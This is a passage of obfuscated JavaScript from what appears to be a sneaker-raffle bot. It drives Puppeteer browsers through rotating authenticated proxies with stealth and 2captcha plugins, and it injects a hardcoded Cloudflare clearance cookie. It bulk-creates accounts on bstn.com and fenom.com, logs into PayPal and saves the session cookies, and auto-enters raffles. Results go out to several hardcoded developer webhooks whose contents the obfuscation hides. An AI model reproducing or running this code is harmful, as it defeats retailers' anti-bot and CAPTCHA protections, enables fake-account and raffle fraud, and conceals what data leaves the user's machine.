                _0x32d178(console['log'](_0x3a3ee9() + '\x20[' + _0x448d47['name'] + ']\x20Task\x20' + (_0xdb7c2c + 0x1) + ':\x20' + _0x167b66));
            }
        };
        try {
            _0x49b010 != 'ver' && console['log'](_0x3a3ee9() + '\x20[' + _0x448d47['name'] + ']\x20Task\x20' + (_0xdb7c2c + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xbd6ad3['data']['attributes']['email']), _0x1b3ad6(_0x4e1346, callback);
        } catch (_0x27c55f) {
            console['log'](_0x3a3ee9() + '\x20Task\x20' + (_0xdb7c2c + 0x1) + ':\x20' + _0x27c55f);
        }
    });
}
;
async function _0x3946c7(_0x31838d, _0x246345, _0x2d1afb) {
    var _0x304479;
    _0x4dc5fe('' + _0x246345);
    var _0x2c490a = _0x2d1afb[0x0]['split'](':');
    const _0x36cb44 = await _0x3d4a9f['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x2c490a[0x0] + ':' + _0x2c490a[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x3a3ee9() + '\x20[' + _0x246345 + ']\x20Getting\x20Session');
        const _0x3ce2ad = JSON['parse'](_0x1da89f['readFileSync']('sessions/log.json')), _0x5cb539 = await _0x36cb44['newPage']();
        await _0x5cb539['authenticate']({
            'username': '' + _0x2c490a[0x2],
            'password': '' + _0x2c490a[0x3]
        }), await _0x5cb539['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x5cb539, await _0x5cb539['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x3a3ee9() + '\x20[' + _0x246345 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x5cb539['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x3a3ee9() + '\x20[' + _0x246345 + ']\x20Successfully\x20logged\x20in'), await _0x1f4682(0x2710), _0x304479 = await _0x5cb539['cookies'](), _0x1da89f['writeFileSync']('sessions/log.json', '' + JSON['stringify'](_0x304479));
        } catch (_0x1ee511) {
            throw new Error('Login\x20session\x20expired\x20' + _0x1ee511);
        }
        for (var _0x425ef1 = 0x0; _0x425ef1 < _0x31838d['length']; _0x425ef1++) {
            console['log'](_0x3a3ee9() + '\x20[' + _0x246345 + ']\x20Task\x20' + (_0x425ef1 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x4dc5fe(_0x246345 + '\x20Task\x20' + (_0x425ef1 + 0x1) + '\x20/\x20' + _0x31838d['length']);
            const _0x23c64c = await _0x36cb44['newPage']();
            await _0x23c64c['goto']('' + _0x31838d[_0x425ef1], { 'waitUntil': 'networkidle2' }), await _0x1f4682(0xbb8);
            try {
                const _0x6c9c7 = await _0x23c64c['$']('#challenge-heading');
                _0x6c9c7 && (console['log'](_0x3a3ee9() + '\x20[' + _0x246345 + ']\x20Task\x20' + (_0x425ef1 + 0x1) + '\x20:\x20' + _0xeca352['yellow']('2FA\x20Required')), await _0x23c64c['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x1f4682(0x61a8), await _0x23c64c['waitForSelector']('#payment-submit-btn'), await _0x23c64c['$eval']('#payment-submit-btn', _0xce5315 => _0xce5315['click']()), await _0x23c64c['click']('#payment-submit-btn');
                try {
                    await _0x23c64c['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x1f4682(0x5dc), console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x246345 + ']\x20Task\x20' + (_0x425ef1 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x102a62) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x102a62['message']);
                } finally {
                    await _0x23c64c['close'](), await _0x1f4682(0x4650);
                }
            } catch (_0x3f8ad8) {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x246345 + ']\x20Task\x20' + (_0x425ef1 + 0x1) + '\x20:\x20' + _0x3f8ad8));
            }
        }
    } catch (_0x3e9711) {
        console['log'](_0xeca352['red']('' + _0x3e9711));
    } finally {
        await _0x36cb44['close']();
    }
}
async function _0x260de2(_0x3779eb, _0x5792a6, _0x3c9f2c) {
    _0x3d4a9f['use'](_0x42d8ce()), _0x3d4a9f['use'](_0x484dec({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x202e3d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x5df78d = 0x0; _0x5df78d < _0x3779eb['length']; _0x5df78d++) {
        var _0x4284f7;
        await _0x2a3946(_0x3779eb, _0x5df78d), _0x4dc5fe(_0x3c9f2c['name'] + '\x20Task\x20' + (_0x5df78d + 0x1) + '\x20/\x20' + _0x3779eb['length'] + '\x20||\x20File:\x20' + _0x3733f2 + '\x20Proxies:\x20' + _0xc68ec8);
        var _0x28c515 = await _0x2221dc(_0x3779eb[_0x5df78d], _0x3c9f2c, 'acc', ![]);
        const _0x35d5d1 = { 'succesDEVMSG': { 'embeds': [_0x28c515] } }, _0x120383 = 'https://www.bstn.com/eu_en/customer/account/';
        var _0x53a6f1 = Math['round'](Math['random']() * (_0x5792a6['length'] - 0x1)), _0x22df6e = _0x5792a6[_0x53a6f1]['split'](':');
        const _0x36a52f = await _0x3d4a9f['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x22df6e[0x0] + ':' + _0x22df6e[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--force-device-scale-factor=0.3'
            ]
        });
        try {
            const _0xceb8c2 = await _0x36a52f['newPage']();
            await _0xceb8c2['authenticate']({
                'username': '' + _0x22df6e[0x2],
                'password': '' + _0x22df6e[0x3]
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x3c9f2c['name'] + ']\x20Task\x20' + (_0x5df78d + 0x1) + '\x20:\x20Getting\x20Session'), await _0xceb8c2['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xceb8c2['setRequestInterception'](!![]), _0xceb8c2['on']('request', _0x182518 => {
                _0x182518['resourceType']() === 'image' ? _0x182518['abort']() : _0x182518['continue']();
            }), await _0xceb8c2['goto']('' + _0x120383), await _0xceb8c2['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0xceb8c2['click']('button[class=\x22cf2Lf6\x22]'), await _0xceb8c2['waitForSelector']('a.action.create.primary.social-login'), console['log'](_0x3a3ee9() + '\x20[' + _0x3c9f2c['name'] + ']\x20Task\x20' + (_0x5df78d + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x1f4682(0x7d0), await _0xceb8c2['click']('a.action.create.primary.social-login'), await _0x1f4682(0x7d0), await _0xceb8c2['click']('button.button.dashboard-actions-toolbar__item'), console['log'](_0x3a3ee9() + '\x20[' + _0x3c9f2c['name'] + ']\x20Task\x20' + (_0x5df78d + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x1f4682(0x190), await _0xceb8c2['type']('#firstname', _0x3779eb[_0x5df78d]['FirstName'], { 'delay': 0xf0 }), await _0x1f4682(0x190), await _0xceb8c2['type']('#lastname', _0x3779eb[_0x5df78d]['LastName'], { 'delay': 0xe6 }), await _0x1f4682(0x190), await _0xceb8c2['type']('#bss_email_address', _0x3779eb[_0x5df78d]['Email'], { 'delay': 0x122 }), await _0x1f4682(0x190), await _0xceb8c2['type']('#password', _0x3779eb[_0x5df78d]['Password'], { 'delay': 0x1e0 }), console['log'](_0x3a3ee9() + '\x20[' + _0x3c9f2c['name'] + ']\x20Task\x20' + (_0x5df78d + 0x1) + '\x20:\x20Sending\x20Request'), await _0x1f4682(0x2bc), await _0xceb8c2['click']('#bt-social-create'), await _0xceb8c2['click']('#bt-social-create'), await _0x1f4682(0x1388);
            const _0x4d2688 = await _0xceb8c2['$']('#bss_email_address-error');
            if (_0x4d2688)
                throw new Error('Invalid\x20Email');
            const _0x548578 = await _0xceb8c2['$']('#password-error');
            if (_0x548578)
                throw new Error('Invalid\x20Password');
            await _0xceb8c2['waitForSelector']('div.mesg-success'), console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x3c9f2c['name'] + ']\x20Task\x20' + (_0x5df78d + 0x1) + '\x20:\x20Account\x20' + _0x3779eb[_0x5df78d]['Email'] + '\x20Generated')), _0x1da89f['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x3779eb[_0x5df78d]['Email'] + ',' + _0x3779eb[_0x5df78d]['Password']);
            try {
                _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x35d5d1['succesDEVMSG']);
            } catch {
            }
            await _0x10557a(_0x16cb69, _0x35d5d1['succesDEVMSG']), console['log'](_0xeca352['yellow'](_0x3a3ee9() + '\x20[' + _0x3c9f2c['name'] + ']\x20Task\x20' + (_0x5df78d + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20verify'));
        } catch (_0x51e73f) {
            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x3c9f2c['name'] + ']\x20Task\x20' + (_0x5df78d + 0x1) + '\x20:\x20' + _0x51e73f)), _0x4284f7 = '' + _0x51e73f;
            var _0x1544a2 = await _0x2221dc(_0x3779eb[_0x5df78d], _0x3c9f2c, 'acc', !![], _0x4284f7);
            _0x35d5d1['errorDEV'] = { 'embeds': [_0x1544a2] }, _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x35d5d1['errorDEV']), await _0x10557a(_0x3df8e6, _0x35d5d1['errorDEV']);
        } finally {
            _0x36a52f['close'](), console['log'](_0x3a3ee9() + '\x20[' + _0x3c9f2c['name'] + ']\x20Waiting\x20for\x20' + _0x202e3d['delay'] + '\x20ms'), await _0x1f4682(_0x202e3d['delay']);
        }
    }
}
async function _0x1e41a0(_0x1e79d5, _0x472bca, _0x1f87a8) {
    _0x3d4a9f['use'](_0x42d8ce());
    for (var _0x253166 = 0x0; _0x253166 < _0x1e79d5['length']; _0x253166++) {
        var _0x2738a3 = Math['round'](Math['random']() * (_0x472bca['length'] - 0x1)), _0x104429 = _0x472bca[_0x2738a3]['split'](':');
        const _0x2c0d2b = await _0x3d4a9f['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x104429[0x0] + ':' + _0x104429[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x413997 = await _0x2c0d2b['newPage']();
            await _0x413997['authenticate']({
                'username': '' + _0x104429[0x2],
                'password': '' + _0x104429[0x3]
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x1f87a8['name'] + ']\x20Task\x20' + (_0x253166 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x413997['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x413997['setRequestInterception'](!![]), _0x413997['on']('request', _0x20222d => {
                _0x20222d['resourceType']() === 'image' || _0x20222d['resourceType']() === 'font' || _0x20222d['resourceType']() === 'media' ? _0x20222d['abort']() : _0x20222d['continue']();
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x1f87a8['name'] + ']\x20Task\x20' + (_0x253166 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x413997['goto'](_0x1e79d5[_0x253166]), console['log'](_0x3a3ee9() + '\x20[' + _0x1f87a8['name'] + ']\x20Task\x20' + (_0x253166 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x413997['waitForTimeout'](0xbb8);
            try {
                await _0x413997['waitForSelector']('.dashboard-main_title'), console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x1f87a8['name'] + ']\x20Task\x20' + (_0x253166 + 0x1) + '\x20:\x20Verification\x20Successful'));
                var _0x4115fd = await _0x2221dc(null, _0x1f87a8, 'ver', ![]);
                const _0x4d81fa = { 'succesDEVMSG': { 'embeds': [_0x4115fd] } };
                await _0x10557a(_0x31745a, _0x4d81fa['succesDEVMSG']);
            } catch (_0x2bfcaa) {
                throw new Error(_0x2bfcaa);
            }
        } catch (_0x35c414) {
            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x1f87a8['name'] + ']\x20Task\x20' + (_0x253166 + 0x1) + '\x20:\x20' + _0x35c414));
            var _0x24e17f = _0x35c414, _0x54117c = await _0x2221dc(null, _0x1f87a8, 'ver', !![], _0x24e17f);
            const _0x33b425 = { 'errorDEVMSG': { 'embeds': [_0x54117c] } };
            _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x33b425['errorDEVMSG']), await _0x10557a(_0x3df8e6, _0x33b425['errorDEVMSG']);
        } finally {
            _0x2c0d2b['close'](), console['log'](_0x3a3ee9() + '\x20[' + _0x1f87a8['name'] + ']\x20Waiting\x20for\x20' + _0x202e3d['delay'] + '\x20ms'), await _0x1f4682(_0x202e3d['delay']);
        }
    }
}
async function _0xc83b3e(_0x29a1f3, _0x554e53, _0x110bfc) {
    _0x3d4a9f['use'](_0x42d8ce()), _0x3d4a9f['use'](_0x484dec({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x202e3d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x206395 = 0x0; _0x206395 < _0x29a1f3['length']; _0x206395++) {
        var _0x48c038;
        await _0x2a3946(_0x29a1f3, _0x206395), _0x4dc5fe(_0x110bfc['name'] + '\x20Task\x20' + (_0x206395 + 0x1) + '\x20/\x20' + _0x29a1f3['length'] + '\x20||\x20File:\x20' + _0x3733f2 + '\x20Proxies:\x20' + _0xc68ec8);
        var _0x22b484 = Math['round'](Math['random']() * (_0x554e53['length'] - 0x1)), _0x5e6704 = _0x554e53[_0x22b484]['split'](':');
        const _0x10a401 = await _0x3d4a9f['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x5e6704[0x0] + ':' + _0x5e6704[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x23f8ff = await _0x10a401['newPage'](), _0x3923b7 = await _0x23f8ff['target']()['createCDPSession'](), { windowId: _0x169a2a } = await _0x3923b7['send']('Browser.getWindowForTarget');
            await _0x23f8ff['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            });
            var _0x239b4d = [{
                'name': 'cf_clearance',
                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                'domain': '.bstn.com',
                'path': '/',
                'expires': 1707818183.331533,
                'httpOnly': !![],
                'secure': !![]
            }];
            await _0x23f8ff['setCookie'](_0x239b4d[0x0]), await _0x23f8ff['authenticate']({
                'username': '' + _0x5e6704[0x2],
                'password': '' + _0x5e6704[0x3]
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x110bfc['name'] + ']\x20Task\x20' + (_0x206395 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x23f8ff['goto']('' + _0x29a1f3[_0x206395]['Url']), console['log'](_0x3a3ee9() + '\x20[' + _0x110bfc['name'] + ']\x20Task\x20' + (_0x206395 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x23f8ff['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x3923b7['send']('Browser.setWindowBounds', {
                'windowId': _0x169a2a,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x1f4682(0x1388), await _0x23f8ff['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x23f8ff['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1f4682(0x1f4), console['log'](_0x3a3ee9() + '\x20[' + _0x110bfc['name'] + ']\x20Task\x20' + (_0x206395 + 0x1) + '\x20:\x20Logging\x20in'), await _0x23f8ff['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x412f41 => _0x412f41['click']()), await _0x23f8ff['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x23f8ff['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1f4682(0x7d0), await _0x23f8ff['waitForSelector']('#email-login'), await _0x23f8ff['type']('#email-login', '' + _0x29a1f3[_0x206395]['Email']), await _0x1f4682(0x1f4), await _0x23f8ff['waitForSelector']('#password'), await _0x23f8ff['type']('#password', '' + _0x29a1f3[_0x206395]['Password']), await _0x1f4682(0x1f4);
            try {
                await _0x23f8ff['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x7c0482 => _0x7c0482['click']()), await _0x23f8ff['click']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]');
            } catch {
            }
            try {
                await _0x23f8ff['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
            } catch (_0x16a41e) {
            }
            await _0x1f4682(0x3e8);
            const _0x51a67a = await _0x23f8ff['$']('.enteredDraw_container__2KmQ_');
            if (_0x51a67a)
                throw new Error('Duplicate\x20Entry');
            console['log'](_0x3a3ee9() + '\x20[' + _0x110bfc['name'] + ']\x20Task\x20' + (_0x206395 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x29a1f3[_0x206395]['Size']);
            if (_0x29a1f3[_0x206395]['Size'] != 'RANDOM') {
                var _0x452905 = _0x29a1f3[_0x206395]['Size']['replace']('.', ',');
                const _0x59aab0 = await _0x23f8ff['$x']('//div[contains(text(),\x20' + _0x452905 + ')]');
                await _0x59aab0[0x0]['click']();
            } else {
                const _0x51ee54 = await _0x23f8ff['$$']('div.swatchTile_tile__IRH9Q');
                var _0x26cc5e = Math['round'](Math['random']() * (_0x51ee54['length'] - 0x1));
                await _0x51ee54[_0x26cc5e]['click']();
            }
            await _0x1f4682(0x1f4);
            const _0x350283 = await _0x23f8ff['$']('.addressList_addressItem__LE2PB');
            if (_0x350283) {
            } else
                console['log'](_0x3a3ee9() + '\x20[' + _0x110bfc['name'] + ']\x20Task\x20' + (_0x206395 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x23f8ff['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x1f4682(0x5dc), await _0x23f8ff['waitForSelector']('#firstname'), await _0x23f8ff['type']('#firstname', '' + _0x29a1f3[_0x206395]['FirstName']), await _0x1f4682(0x1f4), await _0x23f8ff['waitForSelector']('#firstname'), await _0x23f8ff['type']('#lastname', '' + _0x29a1f3[_0x206395]['LastName']), await _0x1f4682(0x1f4), await _0x23f8ff['waitForSelector']('#firstname'), await _0x23f8ff['type']('#street', '' + _0x29a1f3[_0x206395]['Address1']), await _0x1f4682(0x1f4), await _0x23f8ff['waitForSelector']('#firstname'), await _0x23f8ff['type']('#houseNumber', _0x29a1f3[_0x206395]['HouseNumber'] + '\x20' + _0x29a1f3[_0x206395]['Address2']), await _0x1f4682(0x1f4), await _0x23f8ff['waitForSelector']('#firstname'), await _0x23f8ff['select']('#country_code', '' + _0x29a1f3[_0x206395]['Country']), await _0x1f4682(0x1f4), await _0x23f8ff['type']('#postcode', '' + _0x29a1f3[_0x206395]['Zip']), await _0x1f4682(0x1f4), await _0x23f8ff['type']('#city', '' + _0x29a1f3[_0x206395]['City']), await _0x1f4682(0x1f4), await _0x23f8ff['type']('#telephone', '' + _0x29a1f3[_0x206395]['Phone']), await _0x1f4682(0x1f4), await _0x23f8ff['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
            await _0x1f4682(0x9c4);
            try {
                await _0x23f8ff['type']('#instagram_name', '' + _0x29a1f3[_0x206395]['Follower']), await _0x23f8ff['click']('.note_groupBtn__WLDwH\x20>\x20button');
            } catch {
            }
            console['log'](_0x3a3ee9() + '\x20[' + _0x110bfc['name'] + ']\x20Task\x20' + (_0x206395 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x1f4682(0x5dc), await _0x23f8ff['click']('.checkBox_boxHolder__wLGVe'), await _0x1f4682(0x1f4), await _0x23f8ff['click']('.termConditions_TC__hll9k\x20>\x20button'), await _0x1f4682(0x1388), await _0x23f8ff['waitForSelector']('.success_msg__2HjJY'), console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x110bfc['name'] + ']\x20Task\x20' + (_0x206395 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            var _0x4b07f0 = await _0x2221dc(_0x29a1f3[_0x206395], _0x110bfc, 'dev', ![]), _0x59cc3b = await _0x2221dc(_0x29a1f3[_0x206395], _0x110bfc, 'pub', ![]);
            const _0x459376 = {
                'succesDEVMSG': { 'embeds': [_0x4b07f0] },
                'succesPUBMSG': { 'embeds': [_0x59cc3b] }
            };
            try {
                _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x459376['succesDEVMSG']), await _0x1f4682(0xc8), await _0x10557a(_0x16dc96, _0x459376['succesDEVMSG']), await _0x1f4682(0xc8), await _0x10557a(_0x146b83, _0x459376['succesPUBMSG']);
            } catch (_0x4cb157) {
                console['log'](_0xeca352['yellow'](_0x3a3ee9() + '\x20[' + _0x110bfc['name'] + ']\x20Task\x20' + (_0x206395 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4cb157));
            }
        } catch (_0x10a77d) {
            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x110bfc['name'] + ']\x20Task\x20' + (_0x206395 + 0x1) + '\x20:\x20' + _0x10a77d)), _0x48c038 = '' + _0x10a77d;
            var _0x202e1a = await _0x2221dc(_0x29a1f3[_0x206395], _0x110bfc, 'dev', !![], _0x48c038), _0x4b07f0 = await _0x2221dc(_0x29a1f3[_0x206395], _0x110bfc, 'dev', ![]), _0x59cc3b = await _0x2221dc(_0x29a1f3[_0x206395], _0x110bfc, 'pub', ![]);
            const _0x43b44f = {
                'succesDEVMSG': { 'embeds': [_0x4b07f0] },
                'succesPUBMSG': { 'embeds': [_0x59cc3b] }
            };
            _0x43b44f['errorDEV'] = { 'embeds': [_0x202e1a] }, _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x43b44f['errorDEV']), await _0x10557a(_0x3df8e6, _0x43b44f['errorDEV']);
        } finally {
            _0x10a401['close'](), console['log'](_0x3a3ee9() + '\x20[' + _0x110bfc['name'] + ']\x20Waiting\x20for\x20' + _0x202e3d['delay'] + '\x20ms'), await _0x1f4682(_0x202e3d['delay']);
        }
    }
}
async function _0x134e28(_0x1e4cb8, _0x402aef, _0x12596d) {
    _0x3d4a9f['use'](_0x42d8ce()), _0x3d4a9f['use'](_0x484dec({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x202e3d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4a9b13 = 0x0; _0x4a9b13 < _0x1e4cb8['length']; _0x4a9b13++) {
        var _0x45a4e1;
        await _0x2a3946(_0x1e4cb8, _0x4a9b13), _0x4dc5fe(_0x12596d['name'] + '\x20Task\x20' + (_0x4a9b13 + 0x1) + '\x20/\x20' + _0x1e4cb8['length'] + '\x20||\x20File:\x20' + _0x3733f2 + '\x20Proxies:\x20' + _0xc68ec8);
        var _0x3e69e3 = await _0x2221dc(_0x1e4cb8[_0x4a9b13], _0x12596d, 'acc', ![]);
        const _0x463cba = { 'succesDEVMSG': { 'embeds': [_0x3e69e3] } }, _0xeaadde = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0x45256e = Math['round'](Math['random']() * (_0x402aef['length'] - 0x1)), _0x191f55 = _0x402aef[_0x45256e]['split'](':');
        const _0x1b5af6 = await _0x3d4a9f['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x191f55[0x0] + ':' + _0x191f55[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x17a804 = await _0x1b5af6['newPage'](), _0x3c4bc5 = await _0x17a804['target']()['createCDPSession'](), { windowId: _0x1c93ca } = await _0x3c4bc5['send']('Browser.getWindowForTarget');
            await _0x17a804['authenticate']({
                'username': '' + _0x191f55[0x2],
                'password': '' + _0x191f55[0x3]
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x12596d['name'] + ']\x20Task\x20' + (_0x4a9b13 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3c4bc5['send']('Browser.setWindowBounds', {
                'windowId': _0x1c93ca,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x17a804['goto']('' + _0xeaadde), console['log'](_0x3a3ee9() + '\x20[' + _0x12596d['name'] + ']\x20Task\x20' + (_0x4a9b13 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x1f4682(0x2710);
            try {
                await _0x17a804['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 });
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            console['log'](_0x3a3ee9() + '\x20[' + _0x12596d['name'] + ']\x20Task\x20' + (_0x4a9b13 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x17a804['type']('input[name=\x22firstname\x22]', '' + _0x1e4cb8[_0x4a9b13]['FirstName']), await _0x1f4682(0x1f4), await _0x17a804['type']('input[name=\x22lastname\x22]', '' + _0x1e4cb8[_0x4a9b13]['LastName']), await _0x1f4682(0x1f4), await _0x17a804['type']('input[name=\x22email\x22]', '' + _0x1e4cb8[_0x4a9b13]['Email']), await _0x1f4682(0x1f4), await _0x17a804['type']('input[name=\x22password\x22]', '' + _0x1e4cb8[_0x4a9b13]['Password']), await _0x1f4682(0x258), await _0x17a804['$eval']('input[name=\x22psgdpr\x22]', _0x8d817f => _0x8d817f['click']()), await _0x1f4682(0x1f4), console['log'](_0x3a3ee9() + '\x20[' + _0x12596d['name'] + ']\x20Task\x20' + (_0x4a9b13 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x17a804['$eval']('#customer-form', _0x5afaa6 => _0x5afaa6['submit']());
            try {
                await _0x17a804['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x12596d['name'] + ']\x20Task\x20' + (_0x4a9b13 + 0x1) + '\x20:\x20Account\x20' + _0x1e4cb8[_0x4a9b13]['Email'] + '\x20Generated')), _0x1da89f['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x1e4cb8[_0x4a9b13]['Email'] + ',' + _0x1e4cb8[_0x4a9b13]['Password']);
                try {
                    _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x463cba['succesDEVMSG']);
                } catch {
                }
                await _0x10557a(_0x16cb69, _0x463cba['succesDEVMSG']);
            } catch (_0x20ae61) {
                throw new Error('Account\x20generation\x20failed:\x20' + _0x20ae61);
            }
        } catch (_0x56ba54) {
            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x12596d['name'] + ']\x20Task\x20' + (_0x4a9b13 + 0x1) + '\x20:\x20' + _0x56ba54)), _0x45a4e1 = '' + _0x56ba54;
            var _0x15e6b2 = await _0x2221dc(_0x1e4cb8[_0x4a9b13], _0x12596d, 'acc', !![], _0x45a4e1);
            _0x463cba['errorDEV'] = { 'embeds': [_0x15e6b2] }, _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x463cba['errorDEV']), await _0x10557a(_0x3df8e6, _0x463cba['errorDEV']);
        } finally {
            _0x1b5af6['close'](), console['log'](_0x3a3ee9() + '\x20[' + _0x12596d['name'] + ']\x20Waiting\x20for\x20' + _0x202e3d['delay'] + '\x20ms'), await _0x1f4682(_0x202e3d['delay']);
        }
    }
}
async function _0x2d6f71(_0x36d56d, _0x962dc8, _0x4a6d44) {
    _0x3d4a9f['use'](_0x42d8ce()), _0x3d4a9f['use'](_0x484dec({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x202e3d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x385b14 = 0x0; _0x385b14 < _0x36d56d['length']; _0x385b14++) {
        var _0x504a07;
        await _0x2a3946(_0x36d56d, _0x385b14), _0x4dc5fe(_0x4a6d44['name'] + '\x20Task\x20' + (_0x385b14 + 0x1) + '\x20/\x20' + _0x36d56d['length'] + '\x20||\x20File:\x20' + _0x3733f2 + '\x20Proxies:\x20' + _0xc68ec8);
        const _0x2d52df = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0x417edd = Math['round'](Math['random']() * (_0x962dc8['length'] - 0x1)), _0x591196 = _0x962dc8[_0x417edd]['split'](':');
        const _0x35c672 = await _0x3d4a9f['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x591196[0x0] + ':' + _0x591196[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x27a909 = await _0x35c672['newPage'](), _0x482138 = await _0x27a909['target']()['createCDPSession'](), { windowId: _0x166fb6 } = await _0x482138['send']('Browser.getWindowForTarget');
            await _0x27a909['authenticate']({
